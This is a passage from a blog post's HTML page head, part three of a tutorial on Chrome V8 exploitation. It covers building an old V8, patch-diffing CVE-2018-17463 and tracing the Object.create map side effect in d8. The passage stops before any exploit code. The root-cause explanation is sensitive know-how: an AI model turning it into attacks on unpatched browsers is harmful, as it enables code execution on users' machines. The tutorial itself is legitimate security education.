

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;p&gt;Hello! OUYA77 here. 2025 is already heading into the fourth quarter. Take care not to catch a seasonal cold, and I hope you spend the rest of the year without regrets &amp;#x1F44D;.&lt;/p&gt;
&lt;p&gt;In Part 1 We looked at Chrome&amp;#x2019;s overall architecture, and in Part 2 I covered how a Type Confusion vulnerability arises in the V8 engine and why that can lead to a Relative R/W primitive.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you haven&amp;#x2019;t read them&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 1.&lt;/a&gt;&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 2.&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This time I&amp;#x2019;ll write a bit article and &amp;#x2014; to get a real whiff of pwnable goodness &amp;#x2014; I&amp;#x2019;ll only recap the Relative R/W from last time and then look at the actual exploit payload used in practice! We&amp;#x2019;ve got a lot to cover, so let&amp;#x2019;s hurry :)&lt;/p&gt;
&lt;h2 id=&#34;0-Relative-R-W-Recap&#34;&gt;&lt;a href=&#34;#0-Relative-R-W-Recap&#34; class=&#34;headerlink&#34; title=&#34;0. Relative R/W Recap&#34;&gt;&lt;/a&gt;0. Relative R/W Recap&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;For performance, V8 relies on assumptions that objects&amp;#x2019; structures won&amp;#x2019;t change and therefore uses internal mechanisms like Hidden Classes (Maps) and ElementsKind. Based on that information, V8&amp;#x2019;s JIT compiler TurboFan produces high-performance native code. But JavaScript is extremely dynamic, and &lt;strong&gt;if an object&amp;#x2019;s structure or an array&amp;#x2019;s type changes at runtime, those assumptions can be violated.&lt;/strong&gt; If V8 fails to properly deoptimize the previously optimized code, the engine may access memory using incorrect type information &amp;#x2014; and, as shown above, that can enable Relative R/W.&lt;/p&gt;
&lt;p&gt;In this part we&amp;#x2019;ll take the journey from using a historical Chrome version to get a Relative Address R/W primitive via Type Confusion, refine that into an Arbitrary Address R/W, and proceed toward code execution. This post covers vulnerabilities from the era before the Heap Sandbox.&lt;/p&gt;
&lt;h2 id=&#34;1-Environments-Set-up&#34;&gt;&lt;a href=&#34;#1-Environments-Set-up&#34; class=&#34;headerlink&#34; title=&#34;1. Environments Set-up&#34;&gt;&lt;/a&gt;1. Environments Set-up&lt;/h2&gt;&lt;p&gt;There&amp;#x2019;s a well-written write-up for the set-up, so I won&amp;#x2019;t go into a long explanation here &amp;#x2014; I&amp;#x2019;ll just add a few notes about the parts that mattered to me while doing it.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Set-up link&amp;#x2192; &lt;a href=&#34;https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159&#34;&gt;https://gist.github.com/jhalon/5cbaab99dccadbf8e783921358020159&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Make sure the Windows SDK versions match exactly. In &lt;code&gt;depot_tools&lt;/code&gt; there&amp;#x2019;s a &lt;code&gt;python3.bat&lt;/code&gt;; when you run &lt;code&gt;where python&lt;/code&gt; in a cmd window, that &lt;code&gt;python3.bat&lt;/code&gt; should be the one that appears. Create a symbolic link named &lt;code&gt;python.bat&lt;/code&gt; that points to it, and put the &lt;code&gt;depot_tools&lt;/code&gt; folder at the very top of your &lt;code&gt;PATH&lt;/code&gt; environment variable. You&amp;#x2019;ll need this for the build!&lt;/p&gt;
&lt;p&gt;Finally, the build expects SDK &lt;code&gt;10.0.26100.0&lt;/code&gt;, so check that version in the Visual Studio Installer and download it. (&lt;code&gt;tools\dev\gm.py x64.debug&lt;/code&gt; has the version hardcoded, so it&amp;#x2019;s best to match that version when you build.)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;c:\dev\source\v8&amp;gt;python3 tools\dev\gm.py x64.debug
# gn gen out\x64.debug
Done. Made &lt;span class=&#34;hljs-number&#34;&gt;740&lt;/span&gt; targets &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;225&lt;/span&gt; files &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;6288&lt;/span&gt;ms
# autoninja -C out\x64.debug d8
offline mode
ninja: Entering directory &lt;span class=&#34;hljs-string&#34;&gt;`out\x64.debug&amp;apos;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;exec_root=C:\dev\source\v8 dir=out\x64.debug&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;build finished&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;local:2609 remote:0 cache:0 cache-write:0(err:0) fallback:0 retry:0 skip:312&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;fs: ops: 41931(err:5273) / r:12710(err:0) 20.66GiB / w:122(err:0) 100.98MiB&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt; resource/capa used(err)  wait-avg |   s m |  serv-avg |   s m |&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  localexec/32   2527(0)  4m03.72s |&amp;#x2582; &amp;#x2582;&amp;#x2582;&amp;#x2587;&amp;#x2588;&amp;#x2583;|    10.08s | &amp;#x2582;&amp;#x2584;&amp;#x2587;&amp;#x2588;&amp;#x2582; |&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;14m13.39s Build Succeeded: 2609 steps - 3.06/s&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;Done! - V8 compilation finished successfully.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you see a pleasant &lt;code&gt;Done!&lt;/code&gt; as shown above, the installation completed successfully! &amp;#x1F64C;&lt;/p&gt;
&lt;p&gt;The JavaScript engine &lt;strong&gt;V8&lt;/strong&gt; does not translate our code directly into machine code. Instead, it first compiles to an intermediate language called &lt;strong&gt;bytecode&lt;/strong&gt;. That bytecode is executed by the &lt;strong&gt;Ignition interpreter&lt;/strong&gt;, and hot/repeated code paths are optimized by the &lt;strong&gt;TurboFan compiler&lt;/strong&gt; into faster machine code.&lt;br&gt;Below is the key portion of the bytecode produced when running a simple JavaScript snippet &lt;code&gt;Array.from(String(&amp;apos;12345&amp;apos;))&lt;/code&gt; in the &lt;code&gt;d8&lt;/code&gt; shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%201.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Array.from(String(&amp;apos;12345&amp;apos;))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This code can be thought of in two main steps.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Execute &lt;code&gt;String(&amp;apos;12345&amp;apos;)&lt;/code&gt; to produce a string object.&lt;/li&gt;
&lt;li&gt;Execute &lt;code&gt;Array.from()&lt;/code&gt; to convert that string object into an array.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Inside V8, both steps are represented in the intermediate language called &lt;strong&gt;bytecode&lt;/strong&gt;. Bytecode and assembly are both low-level representations of code, but they differ significantly. Assembly (and machine code) issues instructions to specific hardware (the CPU), so it&amp;#x2019;s architecture-dependent and must be compiled for a particular CPU to run.&lt;/p&gt;
&lt;p&gt;By contrast, bytecode is an abstract set of instructions that is not tied to any specific hardware. It runs on top of a virtual &amp;#x201C;machine&amp;#x201D; &amp;#x2014; the Ignition interpreter &amp;#x2014; so JavaScript code can run immediately on different operating systems and CPU architectures without a separate compile step.&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;D8&lt;/strong&gt; used here is V8&amp;#x2019;s developer/debug shell. With D8 you can run V8 without a browser and use debugging flags like &lt;code&gt;--print-bytecode&lt;/code&gt; to inspect the engine&amp;#x2019;s internals. It&amp;#x2019;s an excellent tool for analyzing how V8 generates and runs bytecode. In this part we&amp;#x2019;ll use D8 thoroughly, step-by-step, to follow the exploit process.&lt;/p&gt;
&lt;p&gt;The analysis post I referenced is: &lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-3/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now let&amp;#x2019;s roll back the git version to trigger the vulnerability in a real V8 build.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\source\v8&amp;gt;git checkout &lt;span class=&#34;hljs-number&#34;&gt;568979f&lt;/span&gt;4d891bafec875fab20f608ff9392f4f29
Updating files: &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;% (&lt;span class=&#34;hljs-number&#34;&gt;15550&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;15550&lt;/span&gt;), done.
Previous HEAD position was b801900344f [gtest] Clean up single-arg `testing::Invoke()`s
HEAD is now at &lt;span class=&#34;hljs-number&#34;&gt;568979f&lt;/span&gt;4d89 [parser] Fix memory accounting of explicitly cleared zones&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To build that version you&amp;#x2019;ll need to install the following additional items.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MSVC v140 - VS 2015 C++ build tools (v14.00)&lt;/li&gt;
&lt;li&gt;MSVC v141 - VS 2017 C++ x64/x86 build tools (v14.16)&lt;/li&gt;
&lt;li&gt;Windows 10 SDK (10.0.17134.0)&lt;ul&gt;
&lt;li&gt;If you have a nearby version, you can copy the SDK folder and rename it to match. I installed &lt;code&gt;10.0.19041.0&lt;/code&gt; and renamed the folder to &lt;code&gt;10.0.17134.0&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\source\v8&amp;gt;gn gen --ide=vs out\x64.debug
ERROR at &lt;span class=&#34;hljs-comment&#34;&gt;//.gn:24:48: No value named &amp;quot;exec_script_whitelist&amp;quot; in scope &amp;quot;build_dotfile_settings&amp;quot;&lt;/span&gt;
exec_script_whitelist = build_dotfile_settings.exec_script_whitelist + []&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It won&amp;#x2019;t work right away! Because these are old versions, you must also align (sync) the build tools to those older toolchains. &lt;del&gt;(2018 already&amp;#x2026; seven years ago &amp;#x2014; TMI, but I was 20 in 2018, hehe.)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;Run &lt;code&gt;gclient sync&lt;/code&gt; to sync the build toolchain. Since the build requires Python 2, make sure &lt;code&gt;where python&lt;/code&gt; lists the Python 2 binary first in your PATH.&lt;br&gt;Also set the following environment variable:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set GYP_MSVS_OVERRIDE_PATH=C:\Program Files (x86)\Microsoft Visual Studio 14.0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;After that, the build should succeed.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;c:\dev\source\v8&amp;gt;gclient sync
...
Running hooks: &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;% (&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;), done&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When building Chrome you may see errors like the one below &amp;#x2014; the flags differ depending on whether the sandbox existed at that time.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;c:\dev\source\v8&amp;gt;gn gen --ide=vs out\x64.debug
Generating Visual Studio projects took &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;ms
Done. Made &lt;span class=&#34;hljs-number&#34;&gt;129&lt;/span&gt; targets from &lt;span class=&#34;hljs-number&#34;&gt;74&lt;/span&gt; files in &lt;span class=&#34;hljs-number&#34;&gt;1597&lt;/span&gt;ms&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;I couldn&amp;#x2019;t get the ninja build to work here; if you can, proceed on Windows using the steps above. If not, you can build on Linux. In Part 4 I plan to cover a 2023 1-day exploit and I&amp;#x2019;ll do that hands-on on Windows!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;2-CVE-2018-17463&#34;&gt;&lt;a href=&#34;#2-CVE-2018-17463&#34; class=&#34;headerlink&#34; title=&#34;2. CVE-2018-17463&#34;&gt;&lt;/a&gt;2. CVE-2018-17463&lt;/h1&gt;&lt;p&gt;CVE-2018-17463 is a Type Confusion vulnerability in &lt;code&gt;Google Chrome Versions 69.0 and before&lt;/code&gt; that allows RCE from the renderer. Let&amp;#x2019;s analyze how this was possible, starting from the root cause.&lt;/p&gt;
&lt;h2 id=&#34;2-1-Root-Cause&#34;&gt;&lt;a href=&#34;#2-1-Root-Cause&#34; class=&#34;headerlink&#34; title=&#34;2.1 Root Cause&#34;&gt;&lt;/a&gt;2.1 &lt;strong&gt;Root Cause&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;The JIT compiler Turbofan performs optimizations by detecting and eliminating duplicate IR. However, if it operates incorrectly it can remove safety checks like &lt;code&gt;type check&lt;/code&gt;, and that is where Type Confusion can occur.&lt;/p&gt;
&lt;h3 id=&#34;Patch-Diffing&#34;&gt;&lt;a href=&#34;#Patch-Diffing&#34; class=&#34;headerlink&#34; title=&#34;Patch Diffing&#34;&gt;&lt;/a&gt;&lt;strong&gt;Patch Diffing&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;If you look at &lt;a href=&#34;https://bugs.chromium.org/p/chromium/issues/detail?id=888923&#34;&gt;Issue 888923&lt;/a&gt;, you&amp;#x2019;ll find a &lt;a href=&#34;https://chromium.googlesource.com/v8/v8.git/+/52a9e67a477bdb67ca893c25c145ef5191976220&#34;&gt;commit&lt;/a&gt; &lt;code&gt;52a9e67a477bdb67ca893c25c145ef5191976220&lt;/code&gt; with the message:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[turbofan] Fix ObjectCreate&amp;#x2019;s side effect annotation.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Examining that change shows that in the JavaScript operation &lt;code&gt;CreateObject&lt;/code&gt; the flag &lt;code&gt;Operator::kNoWrite&lt;/code&gt; was changed to &lt;code&gt;Operator::kNoProperties&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\source\v8&amp;gt;git show &lt;span class=&#34;hljs-number&#34;&gt;52&lt;/span&gt;a9e67a477bdb67ca893c25c145ef5191976220
commit &lt;span class=&#34;hljs-number&#34;&gt;52&lt;/span&gt;a9e67a477bdb67ca893c25c145ef5191976220
Author: Jaroslav Sevcik &amp;lt;jarin@chromium.org&amp;gt;
Date:   Wed Sep &lt;span class=&#34;hljs-number&#34;&gt;26&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;47&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2018&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0200&lt;/span&gt;

    [turbofan] Fix ObjectCreate&lt;span class=&#34;hljs-number&#34;&gt;&amp;apos;&lt;/span&gt;s side effect annotation.

    Bug: chromium:&lt;span class=&#34;hljs-number&#34;&gt;888923&lt;/span&gt;
    Change-Id: Ifb22cd9b34f53de3cf6e47cd92f3c0abeb10ac79
    Reviewed-on: https:&lt;span class=&#34;hljs-comment&#34;&gt;//chromium-review.googlesource.com/1245763&lt;/span&gt;
    Reviewed-by: Benedikt Meurer &amp;lt;bmeurer@chromium.org&amp;gt;
    Commit-Queue: Jaroslav Sevcik &amp;lt;jarin@chromium.org&amp;gt;
    Cr-Commit-Position: refs/heads/master@{#&lt;span class=&#34;hljs-number&#34;&gt;56236&lt;/span&gt;}

diff --git a/src/compiler/js-&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;.cc b/src/compiler/js-&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;.cc
index &lt;span class=&#34;hljs-number&#34;&gt;94b&lt;/span&gt;018c987d.&lt;span class=&#34;hljs-number&#34;&gt;.5&lt;/span&gt;ed3f74e075 &lt;span class=&#34;hljs-number&#34;&gt;100644&lt;/span&gt;
--- a/src/compiler/js-&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;.cc
+++ b/src/compiler/js-&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;.cc
@@ &lt;span class=&#34;hljs-number&#34;&gt;-622&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;622&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt; @@ &lt;span class=&#34;hljs-function&#34;&gt;CompareOperationHint &lt;span class=&#34;hljs-title&#34;&gt;CompareOperationHintOf&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; Operator* op)&lt;/span&gt; &lt;/span&gt;{
   V(CreateKeyValueArray, Operator::kEliminatable, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                \
   V(CreatePromise, Operator::kEliminatable, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                      \
   V(CreateTypedArray, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                   \
-  V(CreateObject, Operator::kNoWrite, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                            \
+  V(CreateObject, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                       \
   V(ObjectIsArray, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                      \
   V(HasProperty, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                        \
   V(HasInPrototypeChain, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                \
diff --git a/test/mjsunit/compiler/regress&lt;span class=&#34;hljs-number&#34;&gt;-888923.&lt;/span&gt;js b/test/mjsunit/compiler/regress&lt;span class=&#34;hljs-number&#34;&gt;-888923.&lt;/span&gt;js
&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; file mode &lt;span class=&#34;hljs-number&#34;&gt;100644&lt;/span&gt;
...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;NoWrite&lt;/code&gt; means &amp;#x201C;the object&amp;#x2019;s state will not be mutated&amp;#x201D; (i.e., no additional memory updates). During this operation there was a side effect that changed the properties&amp;#x2019; layout (the Map), so the fix was to indicate &amp;#x201C;this object&amp;#x2019;s properties do not change&amp;#x201D; to prevent the optimizer from assuming the Map is unmodified.&lt;/p&gt;
&lt;h3 id=&#34;Code-Review&#34;&gt;&lt;a href=&#34;#Code-Review&#34; class=&#34;headerlink&#34; title=&#34;Code Review&#34;&gt;&lt;/a&gt;Code Review&lt;/h3&gt;&lt;p&gt;When you call &lt;code&gt;Object.create(proto)&lt;/code&gt; in JavaScript, it creates a new object and directly sets that object&amp;#x2019;s &lt;code&gt;[[Prototype]]&lt;/code&gt; to &lt;code&gt;proto&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; animal = { &lt;span class=&#34;hljs-attr&#34;&gt;type&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;animal&amp;quot;&lt;/span&gt; };
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; dog = &lt;span class=&#34;hljs-built_in&#34;&gt;Object&lt;/span&gt;.create(animal);
&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.log(dog.type); &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;quot;animal&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here &lt;code&gt;dog&lt;/code&gt; does not have its own &lt;code&gt;type&lt;/code&gt; property, but because its &lt;code&gt;[[Prototype]]&lt;/code&gt; points to &lt;code&gt;animal&lt;/code&gt;, &lt;code&gt;dog.type&lt;/code&gt; resolves to &lt;code&gt;&amp;quot;animal&amp;quot;&lt;/code&gt;. Thus &lt;code&gt;Object.create&lt;/code&gt; acts as a &amp;#x201C;glue&amp;#x201D; that starts a new prototype chain.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JavaScript objects and the prototype chain&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Every object in JavaScript internally has a hidden link called &lt;code&gt;[[Prototype]]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;This link points to another object (the prototype), which may in turn have its own prototype.&lt;/li&gt;
&lt;li&gt;The linked sequence forms the &lt;strong&gt;prototype chain&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;When JS looks up a property or method:&lt;ol&gt;
&lt;li&gt;It checks the object itself.&lt;/li&gt;
&lt;li&gt;If not found, it follows &lt;code&gt;[[Prototype]]&lt;/code&gt; upwards.&lt;/li&gt;
&lt;li&gt;It repeats until it reaches &lt;code&gt;null&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;image%202.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;#x2019;s follow how the &lt;code&gt;ObjectCreate&lt;/code&gt; function constructs a new map. The &lt;code&gt;ObjectCreate&lt;/code&gt; function takes the prototype as an argument and calls &lt;code&gt;GetObjectCreateMap&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GetObjectCreateMap&lt;/code&gt;&amp;#x2019;s job is to &lt;strong&gt;return the Object Create Map appropriate for the given prototype&lt;/strong&gt;. This is where a side effect can occur.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;JSObject::OptimizeAsPrototype&lt;/code&gt;: Converts the given object into a &amp;#x201C;prototype-optimized&amp;#x201D; state &amp;#x2014; i.e., transforms a regular object into a prototype object.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Map::TransitionToPrototype&lt;/code&gt;: Transitions the map to match the new prototype &amp;#x2014; in other words, it changes the map&amp;#x2019;s linkage/structure.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This matters because the code is effectively doing &amp;#x201C;the newly created object becomes a prototype object, and the map associated with that object is changed at the same time.&amp;#x201D; Therefore, simply calling &lt;code&gt;Object.create(proto)&lt;/code&gt; can cause &lt;strong&gt;the object to become a prototype object and its associated map layout to change&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&#34;Practice&#34;&gt;&lt;a href=&#34;#Practice&#34; class=&#34;headerlink&#34; title=&#34;Practice&#34;&gt;&lt;/a&gt;Practice&lt;/h3&gt;&lt;p&gt;Now let&amp;#x2019;s verify this in &lt;code&gt;d8&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\source\v8&amp;gt;out\x64.debug\d8 --allow-natives-syntax
V8 version &lt;span class=&#34;hljs-number&#34;&gt;14.2&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.0&lt;/span&gt; (candidate)
d8&amp;gt; let obj = {x:&lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;};
undefined
d8&amp;gt; %DebugPrint(obj)
DebugPrint: &lt;span class=&#34;hljs-number&#34;&gt;0x21700389515&lt;/span&gt;: [JS_OBJECT_TYPE]
 - &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x02170006c2fd&lt;/span&gt; &amp;lt;Map[&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
 - prototype: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000545fd&lt;/span&gt; &amp;lt;Object &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0000021700053979&lt;/span&gt;&amp;gt;
 - elements: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007bd&lt;/span&gt; &amp;lt;FixedArray[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&amp;gt; [HOLEY_ELEMENTS]
 - properties: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007bd&lt;/span&gt; &amp;lt;FixedArray[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&amp;gt;
 - All own properties (excluding elements): {
    &lt;span class=&#34;hljs-number&#34;&gt;0x21700003601&lt;/span&gt;: [String] in ReadOnlySpace: #x: &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; data field &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, attrs: [WEC]) @ Any, location: in-object
 }
&lt;span class=&#34;hljs-number&#34;&gt;0x2170006c2fd&lt;/span&gt;: [Map] in OldSpace
 - &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x021700053419&lt;/span&gt; &amp;lt;MetaMap (&lt;span class=&#34;hljs-number&#34;&gt;0x021700053469&lt;/span&gt; &amp;lt;NativeContext[&lt;span class=&#34;hljs-number&#34;&gt;300&lt;/span&gt;]&amp;gt;)&amp;gt;
 - type: JS_OBJECT_TYPE
 - instance size: &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;  
 - inobject properties: &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
 - unused property fields: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
 - elements kind: HOLEY_ELEMENTS
 - &lt;span class=&#34;hljs-keyword&#34;&gt;enum&lt;/span&gt; length: invalid
 - stable_map
 - back pointer: &lt;span class=&#34;hljs-number&#34;&gt;0x02170006c2d5&lt;/span&gt; &amp;lt;Map[&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;](HOLEY_ELEMENTS)&amp;gt;
 - prototype_validity_cell: &lt;span class=&#34;hljs-number&#34;&gt;0x021700000ac9&lt;/span&gt; &amp;lt;Cell value= [cleared]&amp;gt;
 - instance descriptors (own) #&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x021700389525&lt;/span&gt; &amp;lt;DescriptorArray[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&amp;gt;
 - prototype: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000545fd&lt;/span&gt; &amp;lt;Object &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0000021700053979&lt;/span&gt;&amp;gt;
 - constructor: &lt;span class=&#34;hljs-number&#34;&gt;0x021700053e91&lt;/span&gt; &amp;lt;JSFunction Object (sfi = &lt;span class=&#34;hljs-number&#34;&gt;0000021700351&lt;/span&gt;A15)&amp;gt;
 - dependent code: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007cd&lt;/span&gt; &amp;lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&amp;gt;
 - construction counter: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;

{x: &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;An object like the one above is created. Now call &lt;code&gt;Object.create&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;d8&amp;gt; Object.create(obj)
{}
